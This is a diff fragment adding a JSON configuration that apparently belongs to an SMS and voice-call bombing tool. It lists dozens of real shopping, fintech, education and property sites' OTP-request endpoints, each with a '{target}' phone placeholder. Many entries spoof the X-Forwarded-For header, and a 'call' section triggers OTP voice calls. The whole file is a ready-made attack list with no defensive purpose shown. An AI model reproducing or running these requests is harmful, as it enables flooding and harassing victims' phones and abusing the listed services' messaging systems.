+        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/voice",
+        "headers": {
+          "Content-Type": "application/json",
+          "client-id": "snitch_secret"
+        },
+        "data": {
+          "mobile_number": "+91{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "otpless_auth",
+        "method": "POST",
+        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "channel": "OTP",
+          "mobile": "{target}",
+          "selectedCountryCode": "+91"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "myimaginestore_registration",
+        "method": "POST",
+        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "cossouq_otp",
+        "method": "POST",
+        "url": "https://www.cossouq.com/mobilelogin/otp/send",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "mobilenumber": "{target}",
+          "otptype": "register"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "jockey_sms_otp",
+        "method": "POST",
+        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{target}?whatsapp=false",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {},
+        "identifier": "true"
+      },
+      {
+        "name": "jockey_whatsapp_resend",
+        "method": "POST",
+        "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{target}?whatsapp=true",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {},
+        "identifier": "true"
+      },
+      {
+        "name": "newme_otp",
+        "method": "POST",
+        "url": "https://prodapi.newme.asia/web/otp/request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile_number": "{target}",
+          "resend_otp_request": true
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "cashfree_otp",
+        "method": "POST",
+        "url": "https://api.cashfree.com/payouts/v1/authorize",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "phone": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "moneyview_otp",
+        "method": "POST",
+        "url": "https://api.moneyview.in/api/v4/user/send-otp",
+        "headers": {
+          "Host": "api.moneyview.in",
+          "content-type": "application/json"
+        },
+        "data": {
+          "mobileNumber": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "fampay_login",
+        "method": "POST",
+        "url": "https://api.fampay.in/account/login/",
+        "headers": {
+          "Host": "api.fampay.in",
+          "content-type": "application/json"
+        },
+        "data": {
+          "phone_number": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "unacademy_otp",
+        "method": "POST",
+        "url": "https://unacademy.com/api/v1/user/get_otp/",
+        "headers": {
+          "Host": "unacademy.com",
+          "content-type": "application/json"
+        },
+        "data": {
+          "phone": "{target}",
+          "country_code": "IN"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "jupiter_resend_otp",
+        "method": "POST",
+        "url": "https://api.jupiter.money/v1/user/resend-otp",
+        "headers": {
+          "Host": "api.jupiter.money",
+          "content-type": "application/json"
+        },
+        "data": {
+          "mobileNumber": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "fashinza_otp",
+        "method": "POST",
+        "url": "https://identity-api.fashinza.com/auth/get-otp",
+        "headers": {
+          "Host": "identity-api.fashinza.com",
+          "content-type": "application/json"
+        },
+        "data": {
+          "phone": "{target}",
+          "countryCode": "+91"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "penpencil_resend_otp",
+        "method": "POST",
+        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+        "headers": {
+          "content-type": "application/json",
+          "user-agent": "okhttp/3.9.1"
+        },
+        "data": {
+          "organizationId": "5eb393ee95fab7468a79d189",
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "indiahomes_otp",
+        "method": "POST",
+        "url": "https://www.indiahomes.com/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "proptiger_otp",
+        "method": "POST",
+        "url": "https://www.proptiger.com/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "commonfloor_otp",
+        "method": "POST",
+        "url": "https://www.commonfloor.com/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "makaan_otp",
+        "method": "POST",
+        "url": "https://www.makaan.com/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "refyne_otp",
+        "method": "POST",
+        "url": "https://prod-api.refyne.co.in/auth/v1/otp/send",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "phone_number": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "agent_finder_otp",
+        "method": "POST",
+        "url": "https://www.agentfinder.co.nz/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "agent_ratings_otp",
+        "method": "POST",
+        "url": "https://www.agentratings.com.au/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "agent_reviews_otp",
+        "method": "POST",
+        "url": "https://www.agentreviews.com.au/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "agent_tracker_otp",
+        "method": "POST",
+        "url": "https://www.agenttracker.com.au/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "agent_view_otp",
+        "method": "POST",
+        "url": "https://www.agentview.com.au/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "healthkart_otp",
+        "method": "POST",
+        "url": "https://www.healthkart.com/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobileNumber": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "orchard_otp",
+        "method": "POST",
+        "url": "https://www.orchard.com/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "sothebysrealty_otp",
+        "method": "POST",
+        "url": "https://www.sothebysrealty.com/api/v1/user/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      }
+    ]
+  },
+  "call": {
+    "91": [
+      {
+        "name": "1mg-call",
+        "method": "POST",
+        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "headers": {
+          "content-type": "application/json; charset=utf-8",
+          "accept-encoding": "gzip",
+          "user-agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "number": "{target}",
+          "is_corporate_user": false,
+          "otp_on_call": true
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "tatacapital-call",
+        "method": "POST",
+        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        "json": {
+          "phone": "{target}",
+          "applSource": "",
+          "isOtpViaCallAtLogin": "true"
+        },
+        "identifier": "false"
+      }
+    ]
+  }
+}
